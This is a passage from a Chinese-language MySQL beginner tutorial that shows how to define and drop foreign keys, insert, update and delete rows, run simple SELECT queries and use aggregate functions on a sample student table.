<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 在创建数据表时语法如下：</span></span><br><span class="line"><span class="keyword">CONSTRAINT</span> 外键名 <span class="keyword">FOREIGN</span> KEY (从表外键字段) <span class="keyword">REFERENCES</span> 主表 (主键字段)</span><br><span class="line"><span class="comment">-- 将创建数据表创号后语法如下：</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 从表名 <span class="keyword">ADD</span> <span class="keyword">CONSTRAINT</span> 外键名 <span class="keyword">FOREIGN</span> KEY (从表外键字段) <span class="keyword">REFERENCES</span> 主表 (主键字段);</span><br></pre></td></tr></table></figure>

<p>示例：创建一个学生表 MySQL命令：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> student05(</span><br><span class="line">id <span class="type">int</span> <span class="keyword">primary</span> key,</span><br><span class="line">name <span class="type">varchar</span>(<span class="number">20</span>)</span><br><span class="line">);</span><br><span class="line"><span class="number">1234</span>AI助手</span><br></pre></td></tr></table></figure>

<p>示例：创建一个班级表 MySQL命令：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> class(</span><br><span class="line">classid <span class="type">int</span> <span class="keyword">primary</span> key,</span><br><span class="line">studentid <span class="type">int</span></span><br><span class="line">);</span><br><span class="line"><span class="number">1234</span>AI助手</span><br></pre></td></tr></table></figure>

<p>示例：学生表作为主表，班级表作为副表设置外键， MySQL命令：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> class <span class="keyword">add</span> <span class="keyword">constraint</span> fk_class_studentid <span class="keyword">foreign</span> key(studentid) <span class="keyword">references</span> student05(id);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="6-1-数据一致性概念"><a href="#6-1-数据一致性概念" class="headerlink" title="6.1 数据一致性概念"></a>6.1 数据一致性概念</h4><p>大家知道：建立外键是为了保证数据的完整和统一性。但是，如果主表中的数据被删除或修改从表中对应的数据该怎么办呢？很明显，从表中对应的数据也应该被删除，否则数据库中会存在很多无意义的垃圾数据。</p>
<h4 id="6-2-删除外键"><a href="#6-2-删除外键" class="headerlink" title="6.2 删除外键"></a>6.2 删除外键</h4><p>语法如下：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 从表名 <span class="keyword">drop</span> <span class="keyword">foreign</span> key 外键名；</span><br></pre></td></tr></table></figure>

<p>示例：删除外键 MySQL命令：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> class <span class="keyword">drop</span> <span class="keyword">foreign</span> key fk_class_studentid;</span><br><span class="line">外键的那个字段不在了证明删除成功了</span><br></pre></td></tr></table></figure>

<h4 id="6-3-关于外键约束需要注意的细节"><a href="#6-3-关于外键约束需要注意的细节" class="headerlink" title="6.3 关于外键约束需要注意的细节"></a>6.3 关于外键约束需要注意的细节</h4><p>1、从表里的外键通常为主表的主键<br>2、从表里外键的数据类型必须与主表中主键的数据类型一致<br>3、主表发生变化时应注意主表与从表的数据一致性问题</p>
<h2 id="六、数据表插入数据"><a href="#六、数据表插入数据" class="headerlink" title="六、数据表插入数据"></a>六、数据表插入数据</h2><p>在MySQL通过INSERT语句向数据表中插入数据。在此，我们先准备一张学生表，代码如下：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> student(</span><br><span class="line">id <span class="type">int</span>,</span><br><span class="line">name <span class="type">varchar</span>(<span class="number">30</span>),</span><br><span class="line">age <span class="type">int</span>,</span><br><span class="line">gender <span class="type">varchar</span>(<span class="number">30</span>)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<h3 id="1-为表中所有字段插入数据"><a href="#1-为表中所有字段插入数据" class="headerlink" title="1. 为表中所有字段插入数据"></a>1. 为表中所有字段插入数据</h3><p>每个字段与其值是严格一一对应的。也就是说：每个值、值的顺序、值的类型必须与对应的字段相匹配。但是，各字段也无须与其在表中定义的顺序一致，它们只要与 VALUES中值的顺序一致即可。<br>语法如下：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> 表名（字段名<span class="number">1</span>,字段名<span class="number">2</span>,...) <span class="keyword">VALUES</span> (值 <span class="number">1</span>,值 <span class="number">2</span>,...);</span><br></pre></td></tr></table></figure>

<p>示例：向学生表中插入一条学生信息 MySQL命令：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> student (id,name,age,gender) <span class="keyword">values</span> (<span class="number">1</span>,<span class="string">&#x27;bob&#x27;</span>,<span class="number">16</span>,<span class="string">&#x27;male&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="2-为表中指定字段插入数据"><a href="#2-为表中指定字段插入数据" class="headerlink" title="2. 为表中指定字段插入数据"></a>2. 为表中指定字段插入数据</h3><p>语法如下：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> 表名（字段名<span class="number">1</span>,字段名<span class="number">2</span>,...) <span class="keyword">VALUES</span> (值 <span class="number">1</span>,值 <span class="number">2</span>,...);</span><br></pre></td></tr></table></figure>

<p>插入数据的方法基本和为表中所有字段插入数据，一样，只是需要插入的字段由你自己指定</p>
<h3 id="3-同时插入多条记录"><a href="#3-同时插入多条记录" class="headerlink" title="3. 同时插入多条记录"></a>3. 同时插入多条记录</h3><p>语法如下：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> 表名 [(字段名<span class="number">1</span>,字段名<span class="number">2</span>,...)]<span class="keyword">VALUES</span> (值 <span class="number">1</span>,值 <span class="number">2</span>,…),(值 <span class="number">1</span>,值 <span class="number">2</span>,…),...;</span><br></pre></td></tr></table></figure>

<p>在该方式中：(字段名1,字段名2,…)是可选的，它用于指定插入的字段名；(值 1,值 2,…),(值 1,值 2,…)表示要插入的记录，该记录可有多条并且每条记录之间用逗号隔开。<br>示例：向学生表中插入多条学生信息 MySQL命令：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> student (id,name,age,gender) <span class="keyword">values</span> (<span class="number">2</span>,<span class="string">&#x27;lucy&#x27;</span>,<span class="number">17</span>,<span class="string">&#x27;female&#x27;</span>),(<span class="number">3</span>,<span class="string">&#x27;jack&#x27;</span>,<span class="number">19</span>,<span class="string">&#x27;male&#x27;</span>),(<span class="number">4</span>,<span class="string">&#x27;tom&#x27;</span>,<span class="number">18</span>,<span class="string">&#x27;male&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="七、更新数据"><a href="#七、更新数据" class="headerlink" title="七、更新数据"></a>七、更新数据</h2><p>在MySQL通过UPDATE语句更新数据表中的数据。在此，我们将就用六中的student学生表</p>
<h3 id="1-UPDATE基本语法"><a href="#1-UPDATE基本语法" class="headerlink" title="1. UPDATE基本语法"></a>1. UPDATE基本语法</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> 表名 <span class="keyword">SET</span> 字段名<span class="number">1</span><span class="operator">=</span>值<span class="number">1</span>[,字段名<span class="number">2</span> <span class="operator">=</span>值<span class="number">2</span>,…] [<span class="keyword">WHERE</span> 条件表达式];</span><br></pre></td></tr></table></figure>

<p>在该语法中：字段名1、字段名2…用于指定要更新的字段名称；值1、值 2…用于表示字段的新数据；WHERE 条件表达式 是可选的，它用于指定更新数据需要满足的条件</p>
<h3 id="2-UPDATE更新部分数据"><a href="#2-UPDATE更新部分数据" class="headerlink" title="2. UPDATE更新部分数据"></a>2. UPDATE更新部分数据</h3><p>示例：将name为tom的记录的age设置为20并将其gender设置为female MySQL命令：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> student <span class="keyword">set</span> age<span class="operator">=</span><span class="number">20</span>,gender<span class="operator">=</span><span class="string">&#x27;female&#x27;</span> <span class="keyword">where</span> name<span class="operator">=</span><span class="string">&#x27;tom&#x27;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="3-UPDATE更新全部数据"><a href="#3-UPDATE更新全部数据" class="headerlink" title="3. UPDATE更新全部数据"></a>3. UPDATE更新全部数据</h3><p>示例：将所有记录的age设置为18 MySQL命令：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> student <span class="keyword">set</span> age<span class="operator">=</span><span class="number">18</span>;</span><br></pre></td></tr></table></figure>

<h2 id="八、删除数据"><a href="#八、删除数据" class="headerlink" title="八、删除数据"></a>八、删除数据</h2><p>在MySQL通过DELETE语句删除数据表中的数据。在此，我们先准备一张数据表，代码如下：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 创建学生表</span></span><br><span class="line"> <span class="keyword">create</span> <span class="keyword">table</span> student(</span><br><span class="line"> id <span class="type">int</span>,</span><br><span class="line"> name <span class="type">varchar</span>(<span class="number">30</span>),</span><br><span class="line"> age <span class="type">int</span>,</span><br><span class="line"> gender <span class="type">varchar</span>(<span class="number">30</span>)</span><br><span class="line"> );</span><br><span class="line"> <span class="comment">-- 插入数据</span></span><br><span class="line"> <span class="keyword">insert</span> <span class="keyword">into</span> student (id,name,age,gender) <span class="keyword">values</span> (<span class="number">2</span>,<span class="string">&#x27;lucy&#x27;</span>,<span class="number">17</span>,<span class="string">&#x27;female&#x27;</span>),(<span class="number">3</span>,<span class="string">&#x27;jack&#x27;</span>,<span class="number">19</span>,<span class="string">&#x27;male&#x27;</span>),(<span class="number">4</span>,<span class="string">&#x27;tom&#x27;</span>,<span class="number">18</span>,<span class="string">&#x27;male&#x27;</span>),(<span class="number">5</span>,<span class="string">&#x27;sal&#x27;</span>,<span class="number">19</span>,<span class="string">&#x27;female&#x27;</span>),(<span class="number">6</span>,<span class="string">&#x27;sun&#x27;</span>,<span class="number">20</span>,<span class="string">&#x27;male&#x27;</span>)</span><br><span class="line">,(<span class="number">7</span>,<span class="string">&#x27;sad&#x27;</span>,<span class="number">13</span>,<span class="string">&#x27;female&#x27;</span>),(<span class="number">8</span>,<span class="string">&#x27;sam&#x27;</span>,<span class="number">14</span>,<span class="string">&#x27;male&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="1-DELETE基本语法"><a href="#1-DELETE基本语法" class="headerlink" title="1. DELETE基本语法"></a>1. DELETE基本语法</h3><p>在该语法中：表名用于指定要执行删除操作的表；[WHERE 条件表达式]为可选参数用于指定删除的条件。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> 表名 [<span class="keyword">WHERE</span> 条件表达式];</span><br></pre></td></tr></table></figure>

<h3 id="2-DELETE删除部分数据"><a href="#2-DELETE删除部分数据" class="headerlink" title="2. DELETE删除部分数据"></a>2. DELETE删除部分数据</h3><p>示例：删除age等于14的所有记录 MySQL命令：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> student <span class="keyword">where</span> age<span class="operator">=</span><span class="number">14</span>;</span><br></pre></td></tr></table></figure>

<h3 id="3-DELETE删除全部数据"><a href="#3-DELETE删除全部数据" class="headerlink" title="3. DELETE删除全部数据"></a>3. DELETE删除全部数据</h3><p>示例：删除student表中的所有记录 MySQL命令：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> student;</span><br></pre></td></tr></table></figure>

<h3 id="4-TRUNCATE和DETELE的区别"><a href="#4-TRUNCATE和DETELE的区别" class="headerlink" title="4. TRUNCATE和DETELE的区别"></a>4. TRUNCATE和DETELE的区别</h3><p>TRUNCATE和DETELE都能实现删除表中的所有数据的功能，但两者也是有区别的：<br>1、DELETE语句后可跟WHERE子句，可通过指定WHERE子句中的条件表达式只删除满足条件的部分记录；但是，TRUNCATE语句只能用于删除表中的所有记录。<br>2、使用TRUNCATE语句删除表中的数据后，再次向表中添加记录时自动增加字段的默认初始值重新由1开始；使用DELETE语句删除表中所有记录后，再次向表中添加记录时自动增加字段的值为删除时该字段的最大值加1<br>3、DELETE语句是DML语句，TRUNCATE语句通常被认为是DDL语句</p>
<h2 id="九、MySQL数据表简单查询"><a href="#九、MySQL数据表简单查询" class="headerlink" title="九、MySQL数据表简单查询"></a>九、MySQL数据表简单查询</h2><h3 id="1-简单查询概述"><a href="#1-简单查询概述" class="headerlink" title="1.简单查询概述"></a>1.简单查询概述</h3><p>简单查询即不含where的select语句。在此，我们讲解简单查询中最常用的两种查询：查询所有字段和查询指定字段。<br>在此，先准备测试数据，代码如下：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 创建数据库</span></span><br><span class="line"><span class="keyword">DROP</span> DATABASE IF <span class="keyword">EXISTS</span> mydb;</span><br><span class="line"><span class="keyword">CREATE</span> DATABASE mydb;</span><br><span class="line">USE mydb;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建student表</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> student (</span><br><span class="line">    sid <span class="type">CHAR</span>(<span class="number">6</span>),</span><br><span class="line">    sname <span class="type">VARCHAR</span>(<span class="number">50</span>),</span><br><span class="line">    age <span class="type">INT</span>,</span><br><span class="line">    gender <span class="type">VARCHAR</span>(<span class="number">50</span>) <span class="keyword">DEFAULT</span> <span class="string">&#x27;male&#x27;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 向student表插入数据</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1001&#x27;</span>, <span class="string">&#x27;lili&#x27;</span>, <span class="number">14</span>, <span class="string">&#x27;male&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1002&#x27;</span>, <span class="string">&#x27;wang&#x27;</span>, <span class="number">15</span>, <span class="string">&#x27;female&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1003&#x27;</span>, <span class="string">&#x27;tywd&#x27;</span>, <span class="number">16</span>, <span class="string">&#x27;male&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1004&#x27;</span>, <span class="string">&#x27;hfgs&#x27;</span>, <span class="number">17</span>, <span class="string">&#x27;female&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1005&#x27;</span>, <span class="string">&#x27;qwer&#x27;</span>, <span class="number">18</span>, <span class="string">&#x27;male&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1006&#x27;</span>, <span class="string">&#x27;zxsd&#x27;</span>, <span class="number">19</span>, <span class="string">&#x27;female&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1007&#x27;</span>, <span class="string">&#x27;hjop&#x27;</span>, <span class="number">16</span>, <span class="string">&#x27;male&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1008&#x27;</span>, <span class="string">&#x27;tyop&#x27;</span>, <span class="number">15</span>, <span class="string">&#x27;female&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1009&#x27;</span>, <span class="string">&#x27;nhmk&#x27;</span>, <span class="number">13</span>, <span class="string">&#x27;male&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1010&#x27;</span>, <span class="string">&#x27;xdfv&#x27;</span>, <span class="number">17</span>, <span class="string">&#x27;female&#x27;</span>);</span><br><span class="line"><span class="number">123456789101112131415161718192021222324</span>AI助手</span><br></pre></td></tr></table></figure>

<h3 id="2-查询所有字段（方法不唯一只是举例）"><a href="#2-查询所有字段（方法不唯一只是举例）" class="headerlink" title="2.查询所有字段（方法不唯一只是举例）"></a>2.查询所有字段（方法不唯一只是举例）</h3><p>查询所有字段 MySQL命令：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> student;</span><br></pre></td></tr></table></figure>

<h3 id="3-查询指定字段（sid、sname）"><a href="#3-查询指定字段（sid、sname）" class="headerlink" title="3.查询指定字段（sid、sname）"></a>3.查询指定字段（sid、sname）</h3><p>查询指定字段（sid、sname） MySQL命令：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> sid,sname <span class="keyword">from</span> student;</span><br></pre></td></tr></table></figure>

<h3 id="4-常数的查询"><a href="#4-常数的查询" class="headerlink" title="4.常数的查询"></a>4.常数的查询</h3><p>在SELECT中除了书写列名，还可以书写常数。可以用于标记<br>常数的查询日期标记 MySQL命令：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> sid,sname,<span class="string">&#x27;2021-03-02&#x27;</span> <span class="keyword">from</span> student;</span><br></pre></td></tr></table></figure>

<h3 id="5-从查询结果中过滤重复数据"><a href="#5-从查询结果中过滤重复数据" class="headerlink" title="5.从查询结果中过滤重复数据"></a>5.从查询结果中过滤重复数据</h3><p>在使用DISTINCT 时需要注意：<br><strong>在SELECT查询语句中DISTINCT关键字只能用在第一个所查列名之前。</strong><br>MySQL命令：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">distinct</span> gender <span class="keyword">from</span> student;</span><br></pre></td></tr></table></figure>

<h3 id="6-算术运算符（举例加运算符）"><a href="#6-算术运算符（举例加运算符）" class="headerlink" title="6.算术运算符（举例加运算符）"></a>6.算术运算符（举例加运算符）</h3><p>在SELECT查询语句中还可以使用加减乘除运算符。<br>查询学生10年后的年龄 MySQL命令：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> sname,age<span class="operator">+</span><span class="number">10</span> <span class="keyword">from</span> student;</span><br></pre></td></tr></table></figure>

<h2 id="十、函数"><a href="#十、函数" class="headerlink" title="十、函数"></a>十、函数</h2><p>在此，先准备测试数据，代码如下：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 创建数据库</span></span><br><span class="line"><span class="keyword">DROP</span> DATABASE IF <span class="keyword">EXISTS</span> mydb;</span><br><span class="line"><span class="keyword">CREATE</span> DATABASE mydb;</span><br><span class="line">USE mydb;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建student表</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> student (</span><br><span class="line">    sid <span class="type">CHAR</span>(<span class="number">6</span>),</span><br><span class="line">    sname <span class="type">VARCHAR</span>(<span class="number">50</span>),</span><br><span class="line">    age <span class="type">INT</span>,</span><br><span class="line">    gender <span class="type">VARCHAR</span>(<span class="number">50</span>) <span class="keyword">DEFAULT</span> <span class="string">&#x27;male&#x27;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 向student表插入数据</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1001&#x27;</span>, <span class="string">&#x27;lili&#x27;</span>, <span class="number">14</span>, <span class="string">&#x27;male&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1002&#x27;</span>, <span class="string">&#x27;wang&#x27;</span>, <span class="number">15</span>, <span class="string">&#x27;female&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1003&#x27;</span>, <span class="string">&#x27;tywd&#x27;</span>, <span class="number">16</span>, <span class="string">&#x27;male&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1004&#x27;</span>, <span class="string">&#x27;hfgs&#x27;</span>, <span class="number">17</span>, <span class="string">&#x27;female&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1005&#x27;</span>, <span class="string">&#x27;qwer&#x27;</span>, <span class="number">18</span>, <span class="string">&#x27;male&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1006&#x27;</span>, <span class="string">&#x27;zxsd&#x27;</span>, <span class="number">19</span>, <span class="string">&#x27;female&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1007&#x27;</span>, <span class="string">&#x27;hjop&#x27;</span>, <span class="number">16</span>, <span class="string">&#x27;male&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1008&#x27;</span>, <span class="string">&#x27;tyop&#x27;</span>, <span class="number">15</span>, <span class="string">&#x27;female&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1009&#x27;</span>, <span class="string">&#x27;nhmk&#x27;</span>, <span class="number">13</span>, <span class="string">&#x27;male&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1010&#x27;</span>, <span class="string">&#x27;xdfv&#x27;</span>, <span class="number">17</span>, <span class="string">&#x27;female&#x27;</span>);</span><br><span class="line"><span class="number">123456789101112131415161718192021222324</span>AI助手</span><br></pre></td></tr></table></figure>

<h3 id="1-聚合函数"><a href="#1-聚合函数" class="headerlink" title="1.聚合函数"></a>1.聚合函数</h3><p>在开发中，我们常常有类似的需求：统计某个字段的最大值、最小值、 平均值等等。为此，MySQL中提供了聚合函数来实现这些功能。所谓聚合，就是将多行汇总成一行；其实，所有的聚合函数均如此——输入多行，输出一行。聚合函数具有自动滤空的功能，若某一个值为NULL，那么会自动将其过滤使其不参与运算。<br><strong>聚合函数使用规则：</strong><br>只有SELECT子句和HAVING子句、ORDER BY子句中能够使用聚合函数。例如，在WHERE子句中使用聚合函数是错误的。<br>接下来，我们学习常用聚合函数。</p>
<h4 id="1-1、count（）"><a href="#1-1、count（）" class="headerlink" title="1.1、count（）"></a>1.1、count（）</h4><p>统计表中数据的行数或者统计指定列其值不为NULL的数据个数<br><em>查询有多少该表中有多少人</em><br>MySQL命令：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> student;</span><br></pre></td></tr></table></figure>

<h4 id="1-2、max（）"><a href="#1-2、max（）" class="headerlink" title="1.2、max（）"></a>1.2、max（）</h4><p>计算指定列的最大值，如果指定列是字符串类型则使用字符串排序运算</p>
<p><em>查询该学生表中年纪最大的学生</em><br>MySQL命令：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">max</span>(age) <span class="keyword">from</span> student;</span><br></pre></td></tr></table></figure>

<h4 id="1-3、min（）"><a href="#1-3、min（）" class="headerlink" title="1.3、min（）"></a>1.3、min（）</h4><p>计算指定列的最小值，如果指定列是字符串类型则使用字符串排序运算</p>
<p>查询该学生表中年纪最小的学生 MySQL命令：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> sname,<span class="built_in">min</span>(age) <span class="keyword">from</span> student;</span><br></pre></td></tr></table></figure>

<h4 id="1-4、sum（）"><a href="#1-4、sum（）" class="headerlink" title="1.4、sum（）"></a>1.4、sum（）</h4><p>计算指定列的数值和，如果指定列类型不是数值类型则计算结果为0<br>查询该学生表中年纪的总和 MySQL命令：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">sum</span>(age) <span class="keyword">from</span> student;</span><br></pre></td></tr></table></figure>

<h4 id="1-5、avg（）"><a href="#1-5、avg（）" class="headerlink" title="1.5、avg（）"></a>1.5、avg（）</h4><p>计算指定列的平均值，如果指定列类型不是数值类型则计算结果为</p>
<p>查询该学生表中年纪的平均数 MySQL命令：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">avg</span>(age) <span class="keyword">from</span> student;</span><br></pre></td></tr></table></figure>

<h3 id="2-其他常用函数"><a href="#2-其他常用函数" class="headerlink" title="2.其他常用函数"></a>2.其他常用函数</h3><p>这里我就不一一举例了，基本混个眼熟，以后用到再细说</p>
